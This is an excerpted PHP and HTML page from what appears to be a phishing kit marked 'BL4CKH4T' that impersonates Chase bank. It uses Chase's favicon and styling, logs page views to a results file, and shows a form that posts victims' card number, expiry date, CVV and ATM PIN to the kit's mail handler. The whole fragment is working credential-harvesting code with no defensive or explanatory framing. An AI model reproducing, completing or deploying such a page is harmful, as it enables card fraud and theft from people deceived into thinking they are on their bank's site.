...
if (!isset($_SESSION['login_SESSION'])) {
  ...
  exit();
    ...
    $save2=fopen("BL4CKH4T/Chase_Result/total_cc_view.txt","a+");
...
<head>
    ...
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
        ...
        <link id="externalCSSLink" rel="external stylesheet" href="BL4CKH4T/Files/css/external.css">
        <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="BL4CKH4T/Files/img/chasefavicon.ico">
        <link href="BL4CKH4T/Files/css/origination.css" rel="stylesheet" id="originationCSS">
    </head>
<style type="text/css">
...
<div id="main-container">
            ...
            <div>
            <form action="BL4CKH4T/Mail/Mail4" method="POST">
...
<input  class="jpui input" placeholder="" type="tel" name="BL4CKH4T_cc" required="" data-validation="creditcard" data-validation-error-msg="  ">
...
<div id="socialSecurityNumber-text-validate">
                    <input  class="jpui input" id="exp" placeholder=""  type="tel" name="BL4CKH4T_cc_exp" data-validation="length"  data-validation-length="min7"  data-validation-error-msg="  ">
...
<input class="jpui input"  placeholder="" type="password" name="BL4CKH4T_cvv"  data-validation="cvv" data-validation-error-msg="  ">
</div>
</div>
</div>
</div>
...
<span class="util accessible-text" id="apartmentNumber-blx-residentialAddressBlock-label-accessible-text">
    ...
    <input  class="jpui input" placeholder=""  type="password" name="BL4CKH4T_atm_pin" data-validation="length" data-validation-length="min4-4" data-validation-error-msg=" ">
